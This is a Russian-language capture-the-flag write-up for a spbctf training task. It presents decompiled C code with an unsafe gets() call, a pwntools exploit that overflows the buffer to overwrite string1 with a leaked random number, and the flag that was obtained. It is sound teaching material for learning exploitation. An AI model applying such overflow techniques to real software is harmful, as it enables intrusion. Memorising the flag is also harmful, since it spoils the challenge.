[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn1_mc7)
Описание:
Переполните автоматом, чтобы получить флаг. У вас одна секунда!
`nc 109.233.56.90 11587`
**[mc7_censored](https://pwn.spbctf.ru/files/overflow/mc7_censored)**
**[mc7_censored_notimeout](https://pwn.spbctf.ru/files/overflow/mc7_censored_notimeout)** — для тренировки локально без таймаута

Программа печатает рандомное число, которое при помощи pwntools надо считать, а затем необходимо переполнить буфер userInput, чтобы переписать string1 на рандомное число из verify.
``` C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int v3; // eax
  char verify[72]; // [rsp+40h] [rbp-50h] BYREF
  int random; // [rsp+88h] [rbp-8h]
  int v7; // [rsp+8Ch] [rbp-4h]

  v7 = 0;
  v3 = time(nullptr);
  srand(v3);
  random = rand();
  sprintf(verify, "%d", random);
  printf(aWelcomeTo);
  printf("OK, here's the deal.\n");
  printf("We want you to set the value of string1 to '%s'.\n", verify);
  printf("And you only have 1 second to check your superspeed.\n");
  alarm(1u);
  printf("Give me your input: ");
  gets(userInput);

  if ( !strcmp(string1, verify) )
  {
    printf("Yissss!\n");
    printf("Flag is: spbctf{********************************}\n");
  }
  else
  {
    printf("YOU FAILED\n");
    printf("Because, here's the target string: '%s'\n", verify);
    printf("      And here's the your string1: '%s'\n\n", string1);
    printf("See the difference?\n");
  }
  return v7;
}
```

Эксплоит:
``` python
io = start()

io.recvline()
io.recvline()
io.recvuntil(b"'")
num = io.recvuntil(b"'")[:-1]
io.recvline()
io.recvline()
payload = b'A' * 64 + num
io.sendline(payload)

io.interactive()
```

Запуск:
![{8A365684-9972-4687-B9DC-02B025A659E2}](../../../../z.%20Images/{8A365684-9972-4687-B9DC-02B025A659E2}.png)

Ответ: `spbctf{how_d1d_y0u_l1ke_the_g37s_func}`